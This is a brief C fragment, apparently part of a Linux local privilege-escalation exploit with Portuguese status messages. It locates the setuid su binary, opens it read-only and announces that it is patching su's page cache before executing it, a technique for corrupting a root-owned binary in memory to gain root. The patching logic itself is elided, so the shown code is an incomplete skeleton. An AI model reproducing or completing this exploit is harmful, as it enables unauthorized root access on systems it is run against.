...
int main(void)
{
    ...
    const char *su_path = find_su();
    if (!su_path) { fprintf(stderr, "[-] su nao encontrado\n"); return 1; }
    printf("[*] su encontrado em: %s\n", su_path);

    int fd = open(su_path, O_RDONLY);
    if (fd < 0) { perror("open su"); return 1; }

    printf("[*] patching page cache de %s...\n", su_path);
    ...
    close(fd);
    printf("[*] patch completo — executando %s...\n", su_path);
